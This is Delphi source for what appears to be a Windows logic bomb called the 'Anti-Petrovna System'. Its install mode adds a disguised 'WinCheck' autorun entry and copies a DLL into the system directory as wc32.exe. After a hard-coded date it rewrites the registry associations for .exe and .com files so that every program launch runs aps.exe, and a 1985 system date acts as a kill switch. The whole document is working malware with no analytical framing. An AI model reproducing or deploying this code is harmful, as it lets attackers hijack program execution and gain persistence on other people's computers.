program apssp;

uses
  Windows, SysUtils, Registry, Classes;

const
  ct: string[10] ='APSD130602';

var
  Day,Month,Year,Chas,Min,Sec,MSec: Word;
  Reg: TRegistry;
  Deactivate: Boolean = false;
  Y,M,D: Integer;
  Windir, Curdir: string;
  PWindir: PChar;
  Res: Integer;

function CopyFile(InFile,OutFile: String;
  From,Count: Longint): Longint;
var
  InFS,OutFS: TFileStream;
begin
  InFS:=TFileStream.Create(InFile,fmOpenRead);
  OutFS:=TFileStream.Create(OutFile,fmCreate);
  InFS.Seek(From,soFromBeginning);
  Result:=OutFS.CopyFrom(InFS,Count);
  InFS.Free;
  OutFS.Free
end;

begin
  GetDir(0,CurDir);
  if CurDir[Length(CurDir)]='\' then
    Delete(CurDir,Length(CurDir),1);
  if LowerCase(ParamStr(1))='install' then
    begin
      Reg:=TRegistry.Create;
      Reg.RootKey:=HKEY_LOCAL_MACHINE;
      Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',false);
      Reg.WriteString('WinCheck','wc32.exe');
      Reg.CloseKey;
      Reg.Free;
      PWindir:=StrAlloc(MAX_PATH);
      Res:=GetSystemDirectory(PWindir,MAX_PATH);
      Windir:=StrPas(PWindir);
      CopyFile(CurDir+'\module.dll',Windir+'\wc32.exe',0,0);
      Exit
    end;
  D:=StrToInt(Copy(ct,5,2));
  M:=StrToInt(Copy(ct,7,2));
  Y:=2000+StrToInt(Copy(ct,9,2));
  DecodeDate(Now,Year,Month,Day);
  if not ((Year=1985) and (Month=5) and (Day=1)) then
    begin
      if Month<M then Halt;
      if Day<D then Halt
    end
                                                 else
    Deactivate:=true;
  // Activating Anti-Petrovna System (Secret Project)...
  Reg:=TRegistry.Create;
  Reg.RootKey:=HKEY_CLASSES_ROOT;
  Reg.OpenKey('\.exe',false);
  if not Deactivate then
    Reg.WriteString('','apsfile')
                    else
    Reg.WriteString('','exefile');
  Reg.CloseKey;
  Reg.OpenKey('\.com',false);
  if not Deactivate then
    Reg.WriteString('','apsfile')
                    else
    Reg.WriteString('','exefile');
  Reg.CloseKey;
  Reg.OpenKey('\apsfile',true);
  Reg.WriteString('','aps-file');
  Reg.CloseKey;
  Reg.OpenKey('\apsfile\shell\Activating APS...\Command',true);
  Reg.WriteString('','aps.exe');
  Reg.CloseKey;
  Reg.Free
end.
